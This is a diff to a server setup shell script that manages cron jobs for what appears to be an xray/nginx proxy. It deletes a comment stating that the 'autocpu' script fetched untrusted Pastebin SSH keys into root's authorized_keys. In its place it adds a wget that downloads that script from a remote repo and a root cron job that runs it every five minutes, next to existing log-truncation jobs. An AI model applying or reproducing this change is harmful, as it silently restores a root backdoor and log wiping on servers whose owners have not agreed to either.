@@ -425,8 +425,12 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 0 22 * * * root /usr/local/sbin/backup
 END
 
-# Removed: autocpu fetched untrusted Pastebin SSH keys and modified root authorized_keys.
-rm -f /etc/cron.d/cpu_otm /usr/bin/autocpu /etc/cron.d/daily_reboot
+cat> /etc/cron.d/cpu_otm << END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+*/5 * * * * root /usr/bin/autocpu
+END
+wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
 cat >/etc/cron.d/xp_sc <<-END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -440,6 +444,12 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
     && truncate -s 0 /var/log/nginx/access.log \
     && truncate -s 0 /var/log/xray/error.log \
     && truncate -s 0 /var/log/xray/access.log
+END
+
+cat >/etc/cron.d/daily_reboot <<-END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+5 0 * * * root /sbin/reboot
 END
 
 service cron restart >/dev/null 2>&1
